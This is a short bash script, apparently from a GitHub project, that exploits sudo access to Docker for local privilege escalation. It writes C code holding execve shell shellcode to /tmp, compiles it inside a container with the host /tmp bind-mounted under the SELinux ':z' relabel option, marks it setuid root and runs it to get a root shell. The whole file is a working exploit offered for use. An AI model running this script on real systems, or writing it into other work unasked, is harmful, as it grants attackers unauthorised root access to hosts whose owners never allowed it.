#!/bin/bash

# SUDO Docker Privilege Escalation 
# https://github.com/pyperanger/dockerevil

# SELINUX "bypass" using :z option
# https://docs.docker.com/engine/admin/volumes/bind-mounts/#configure-the-selinux-label


echo "[*] SUDO Docker Privilege Escalation";

echo "[+] Writing shellcode";

cat > /tmp/sud0-d0ck3r.c <<'EOF'

#include <unistd.h>
#include <stdlib.h>
 
unsigned char shellcode[] = \
"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
int main()
{
    setgid(0); 
    setuid(0);
    int (*ret)() = (int(*)())shellcode;
    ret();
}

EOF

echo "[+] Compiling shellcode in container";

sudo docker run -t -v /tmp/:/tmp/:z pype/ubuntu_gcc /bin/sh -c 'gcc -fno-stack-protector -z execstack /tmp/sud0-d0ck3r.c -o /tmp/sud0-d0ck3r && chmod +xs /tmp/sud0-d0ck3r'

echo "[+] r00t sh3ll !";
/tmp/sud0-d0ck3r
